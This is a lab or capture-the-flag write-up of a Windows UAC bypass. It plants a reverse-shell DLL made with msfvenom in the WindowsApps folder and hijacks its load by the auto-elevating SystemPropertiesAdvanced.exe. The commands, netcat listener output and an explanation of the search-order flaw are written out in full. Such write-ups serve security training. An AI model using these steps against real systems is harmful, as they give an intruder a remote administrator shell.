[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities. Applications have different `integrity` levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.

When UAC is in place, a user can log into their system with their standard user account. When processes are launched using a standard user token, they can perform tasks using the rights granted to a standard user. Some applications require additional permissions to run, and UAC can provide additional access rights to the token for them to run correctly.

The `default RID 500 administrator` account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in


- Follow the steps in this section to obtain a reverse shell connection with normal user privileges and another which bypasses UAC. Submit the contents of flag.txt on the sarah user's Desktop when finished.

steps.

```

C:\Users\sarah>net localgroup  Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
The command completed successfully.
```

```

C:\Users\sarah>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1

```

now we know that UAC is on (0x1).

```

PS C:\Users\sarah> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0



```

now we have to check the path.

```
PS C:\Users\sarah> cmd /c echo %PATH%
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\sarah\AppDa
ta\Local\Microsoft\WindowsApps;
PS C:\Users\sarah>

```

generate a payload and download the dll to the target.
```

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

sudo python3 -m http.server 8080

dll"
PS C:\Users\sarah> curl http://10.10.15.0:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.
dll"
PS C:\Users\sarah> ls C:\Users\sarah\AppData\Local\Microsoft\WindowsApps


    Directory: C:\Users\sarah\AppData\Local\Microsoft\WindowsApps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         7/3/2026   7:10 AM           9216 srrstr.dll


PS C:\Users\sarah>
```


after executing this cmd we will get a reverse shell in our listener.

```

PS C:\Users\sarah>  rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
PS C:\Users\sarah>


```

we have revshell but with the same privilege.

```
└─$  nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.15.0] from (UNKNOWN) [10.129.47.51] 49675
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\sarah>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

```

Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host.
```
PS C:\Users\sarah> tasklist /svc | findstr "rundll32"
rundll32.exe                  5064 N/A
rundll32.exe                  1044 N/A
PS C:\Users\sarah> taskkill /PID 5064 /F
SUCCESS: The process with PID 5064 has been terminated.
PS C:\Users\sarah> taskkill /PID 1044 /F
SUCCESS: The process with PID 1044 has been terminated.
PS C:\Users\sarah> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

```
└─$  nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.15.0] from (UNKNOWN) [10.129.47.51] 49675
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\sarah>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\sarah>^C
                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/365_DAYS/day-009]
└─$  nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.15.0] from (UNKNOWN) [10.129.47.51] 49676
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled

```

now we have the escalated.
we can find the flag in the user sarah's desktop.

### Command 1: Manual Execution (Testing Only)

DOS

```
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

- **What it does:** You are explicitly telling Windows to run your malicious `srrstr.dll` file.
    
- **The Result:** Because _you_ (a low-privileged user) started the process, the payload runs with your exact same **low-privileged permissions**. UAC blocks it from doing anything advanced.
    
- **Why do it?** You only run this command to **test** if your reverse shell payload actually works and connects back to your attack machine.
    

### Command 2: The Actual UAC Bypass (Exploit)

DOS

```
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

- **What it does:** You do **not** run the DLL yourself here. Instead, you launch a legitimate, trusted Windows management utility.
    
- **The Trick:** Because `SystemPropertiesAdvanced.exe` is an official Windows administrative tool, Windows automatically grants it **high privileges** (auto-elevation) without prompting the user with a UAC pop-up.
    
- **The Vulnerability:** When this 32-bit utility starts up, it naturally looks for a system DLL called `srrstr.dll`. Due to a flaw in its search order, it looks inside the `WindowsApps` folder _before_ looking in the secure system folders.
    

### Summary of the Workflow

1. You place your fake `srrstr.dll` in the `WindowsApps` folder.
    
2. You test it manually with `rundll32` (Command 1) just to verify the shell works (it will be low-privilege).
    
3. You execute `SystemPropertiesAdvanced.exe` (Command 2).
    
4. The high-privilege Windows tool automatically searches for, finds, and **executes your fake DLL inside its own high-privilege memory space**.
    
5. Your reverse shell catches a connection, but this time it drops you into a **High-Integrity (Administrator) Command Prompt**.

